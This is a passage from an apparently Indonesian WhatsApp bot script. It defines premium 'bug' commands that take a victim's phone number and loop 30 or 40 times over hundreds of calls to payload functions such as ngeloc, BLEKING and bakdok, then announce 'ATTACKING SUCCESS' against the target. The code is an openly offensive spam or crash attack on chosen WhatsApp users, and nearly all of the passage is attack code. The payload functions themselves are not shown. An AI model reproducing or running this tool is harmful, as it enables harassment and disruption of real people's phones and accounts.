target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
reply(`「 𒈒𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒✔ 」
  🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃
│──▄────▄▄▄▄▄▄▄────▄───│
│─▀▀▄─▄█████████▄─▄▀▀──│
│─────██─▀███▀─██──────│
│───▄─▀████▀████▀─▄────│
│─▀█────██▀█▀██────█▀──│
│༂ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐓𝐎 : ${target} ༂         
│༂ 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command} ༂
│𝐒𝐜𝐫𝐢𝐩𝐭 𝐓𝐨 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 3.0,
│𝐣𝐚𝐧𝐠𝐚𝐧 𝐦𝐞𝐧𝐠𝐮𝐣𝐢 𝐤𝐞𝐩𝐚𝐝𝐚 
│𝐨𝐫𝐚𝐧𝐠 𝐲𝐚𝐧𝐠 𝐠𝐚𝐤 𝐚𝐝𝐚 𝐬𝐚𝐥𝐚𝐡
╚─────「 𝐁𝐮𝐠 💞⃟𒆜ᥴіᥴі іmᥙ𝗍⃟╳🌸 𝐆𝐚𝐜𝐨𝐫🤩」──`)
break

case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-forger':
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 40; i++) {
await beta2(kandiXD, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(kandiXD, target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
